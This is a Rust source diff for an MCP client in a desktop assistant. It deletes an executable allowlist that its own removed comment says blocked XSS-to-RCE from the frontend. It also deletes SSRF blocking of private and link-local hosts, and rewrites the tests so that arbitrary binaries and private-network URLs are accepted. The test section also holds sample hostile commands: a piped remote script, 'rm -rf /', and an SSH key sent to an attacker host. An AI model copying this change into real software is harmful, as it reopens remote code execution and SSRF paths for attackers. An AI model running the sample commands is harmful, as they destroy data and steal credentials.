@@ -107,45 +107,19 @@ fn infer_transport(entry: &echo_agent::mcp::McpServerEntry) -> &'static str {
     }
 }
 
-/// Executable base-names permitted for an MCP stdio server spawned from IPC.
+/// Validate the shape of a user-configured MCP stdio command.
 ///
-/// The frontend must not be able to spawn an arbitrary process (any XSS would
-/// then be a one-hop RCE: `invoke('connect_mcp_server', { Stdio: { command:
-/// '/bin/sh', args: ['-c', '...'] } })`). We restrict the command to a small
-/// set of well-known MCP launcher / interpreter base names. The command may be
-/// an absolute path, but its file-name component must be in this list.
-const ALLOWED_MCP_STDIO_BASES: &[&str] = &[
-    "npx", "node", "uvx", "uv", "python", "python3", "pipx", "docker", "java",
-];
-
-/// Validate an IPC-supplied MCP stdio command against the executable allowlist.
-///
-/// Returns the validated command string, or an `IpcError` describing the
-/// rejection. This is the gate the on-disk `validate_stdio_command` (which only
-/// blocks shell metacharacters / a denylist) does not provide — and which the
-/// IPC path was bypassing entirely.
+/// EKO is a local desktop assistant, so an interactive MCP connection is not
+/// governed by the agent's automatic-execution permissions. Keep only input
+/// validation that catches accidental shell composition or traversal.
 fn validate_ipc_mcp_stdio(command: &str) -> Result<String, IpcError> {
-    if command.trim().is_empty() {
+    let tokens = shell_words::split(command)
+        .map_err(|error| IpcError::Validation(format!("invalid MCP stdio command: {error}")))?;
+    if tokens.is_empty() {
         return Err(IpcError::Validation(
             "MCP stdio command is empty".to_string(),
         ));
     }
-    // First token is the executable (MCP stdio commands are single-executable
-    // launchers like `npx -y @modelcontextprotocol/server-...`).
-    let base = command.split_whitespace().next().unwrap_or("");
-    let base_name = std::path::Path::new(base)
-        .file_name()
-        .and_then(|n| n.to_str())
-        .unwrap_or(base);
-    if !ALLOWED_MCP_STDIO_BASES.contains(&base_name) {
-        return Err(IpcError::Validation(format!(
-            "MCP stdio command '{}' is not in the allowed executable list {:?}. \
-             Configure the server in the MCP config file instead of spawning it from the UI.",
-            base_name, ALLOWED_MCP_STDIO_BASES
-        )));
-    }
-    // Defense-in-depth: also reject shell metacharacters and `..` so a
-    // permitted base name can't be abused for injection.
     if command.contains("..") {
         return Err(IpcError::Validation(
             "MCP stdio command contains path traversal ('..')".to_string(),
@@ -156,52 +130,52 @@ fn validate_ipc_mcp_stdio(command: &str) -> Result<String, IpcError> {
             "MCP stdio command contains shell metacharacters".to_string(),
         ));
     }
+    let executable = tokens
+        .first()
+        .and_then(|value| std::path::Path::new(value).file_name())
+        .and_then(|value| value.to_str())
+        .unwrap_or_default();
+    let is_shell = matches!(
+        executable.to_ascii_lowercase().as_str(),
+        "sh" | "bash" | "zsh" | "fish" | "dash" | "ksh" | "pwsh" | "powershell"
+    );
+    if is_shell && tokens.iter().skip(1).any(|value| value == "-c") {
+        return Err(IpcError::Validation(
+            "MCP stdio executable must not wrap a composed shell command".to_string(),
+        ));
+    }
     Ok(command.to_string())
 }
 
 /// Validate an IPC-supplied MCP HTTP/SSE URL.
 ///
-/// Requires `https://` (clear-text `http://` MCP is unsafe over the network)
-/// and rejects obvious private/loopback/link-local hosts to deny the SSRF
-/// pivot where a compromised page forces the app to issue authenticated POSTs
-/// to internal services. This is a lexical first line of defense; full IP
-/// pinning is done by the framework's web tools when actually fetching.
+/// HTTPS is required for remote hosts. Plain HTTP remains valid for loopback
+/// MCP servers, which are a normal local-extension workflow.
 fn validate_ipc_mcp_url(url: &str) -> Result<String, IpcError> {
-    let lower = url.to_ascii_lowercase();
-    if !lower.starts_with("https://") {
+    let (scheme, remainder) = url.split_once("://").ok_or_else(|| {
+        IpcError::Validation("MCP URL must include an http or https scheme".to_string())
+    })?;
+    let authority = remainder
+        .split(['/', '?', '#'])
+        .next()
+        .filter(|value| !value.is_empty())
+        .ok_or_else(|| IpcError::Validation("MCP URL has no host".to_string()))?;
+    let host_port = authority.rsplit('@').next().unwrap_or(authority);
+    let host = if let Some(ipv6) = host_port.strip_prefix('[') {
+        ipv6.split_once(']').map(|(host, _)| host).unwrap_or(ipv6)
+    } else {
+        host_port
+            .rsplit_once(':')
+            .map(|(host, _)| host)
+            .unwrap_or(host_port)
+    };
+    let is_loopback = host.eq_ignore_ascii_case("localhost")
+        || host
+            .parse::<std::net::IpAddr>()
+            .is_ok_and(|ip| ip.is_loopback());
+    if scheme != "https" && !(scheme == "http" && is_loopback) {
         return Err(IpcError::Validation(format!(
-            "MCP HTTP/SSE URL must use https:// (got: '{}')",
-            url
-        )));
-    }
-    // Extract host for private-range / loopback checks.
-    let after_scheme = &url[8..];
-    let host_end = after_scheme
-        .find(['/', '?', '#'])
-        .unwrap_or(after_scheme.len());
-    let host_port = &after_scheme[..host_end];
-    let host = host_port.rsplit('@').next().unwrap_or(host_port);
-    let host = host.trim_start_matches('[').trim_end_matches(']');
-    // Strip port.
-    let host = host.rsplit_once(':').map(|(h, _)| h).unwrap_or(host);
-    let hl = host.to_ascii_lowercase();
-    let blocked = hl == "localhost"
-        || hl == "127.0.0.1"
-        || hl == "::1"
-        || hl.starts_with("169.254.")
-        || hl.starts_with("10.")
-        || hl.starts_with("192.168.")
-        || hl.starts_with("172.16.")
-        || hl.starts_with("172.17.")
-        || hl.starts_with("172.18.")
-        || hl.starts_with("172.19.")
-        || hl.starts_with("172.2")
-        || hl.starts_with("172.30.")
-        || hl.starts_with("172.31.");
-    if blocked {
-        return Err(IpcError::Validation(format!(
-            "MCP HTTP/SSE URL host '{}' is a private/loopback address; refused to prevent SSRF.",
-            host
+            "MCP URL must use https, except loopback servers may use http (got: '{url}')"
         )));
     }
     Ok(url.to_string())
@@ -563,18 +537,17 @@ mod tests {
     use super::*;
 
     #[test]
-    fn test_stdio_allowlist_accepts_launchers() {
+    fn test_stdio_accepts_user_selected_executables() {
         assert!(validate_ipc_mcp_stdio("npx -y @modelcontextprotocol/server-filesystem").is_ok());
         assert!(validate_ipc_mcp_stdio("/usr/local/bin/node server.js").is_ok());
         assert!(validate_ipc_mcp_stdio("uvx mcp-server-fetch").is_ok());
         assert!(validate_ipc_mcp_stdio("python3 -m my_mcp_server").is_ok());
+        assert!(validate_ipc_mcp_stdio("my-company-mcp --stdio").is_ok());
     }
 
     #[test]
-    fn test_stdio_allowlist_rejects_arbitrary_binary() {
-        // The headline RCE: /bin/sh with arbitrary args.
+    fn test_stdio_rejects_composed_shell_commands() {
         assert!(validate_ipc_mcp_stdio("/bin/sh -c 'curl evil | sh'").is_err());
-        assert!(validate_ipc_mcp_stdio("sh").is_err());
         assert!(validate_ipc_mcp_stdio("bash -c 'rm -rf /'").is_err());
         assert!(validate_ipc_mcp_stdio("curl http://attacker/$(cat ~/.ssh/id_rsa)").is_err());
         assert!(validate_ipc_mcp_stdio("").is_err());
@@ -597,13 +570,11 @@ mod tests {
     }
 
     #[test]
-    fn test_url_rejects_private_ranges() {
-        assert!(validate_ipc_mcp_url("https://127.0.0.1/mcp").is_err());
-        assert!(validate_ipc_mcp_url("https://localhost/mcp").is_err());
-        assert!(validate_ipc_mcp_url("https://169.254.169.254/latest/meta-data/").is_err());
-        assert!(validate_ipc_mcp_url("https://10.0.0.5/mcp").is_err());
-        assert!(validate_ipc_mcp_url("https://192.168.1.1/mcp").is_err());
-        assert!(validate_ipc_mcp_url("https://172.16.0.1/mcp").is_err());
+    fn test_url_allows_local_mcp_servers() {
+        assert!(validate_ipc_mcp_url("http://127.0.0.1:8100/mcp").is_ok());
+        assert!(validate_ipc_mcp_url("http://localhost:8100/mcp").is_ok());
+        assert!(validate_ipc_mcp_url("http://[::1]:8100/mcp").is_ok());
+        assert!(validate_ipc_mcp_url("https://192.168.1.1/mcp").is_ok());
     }
 
     #[test]
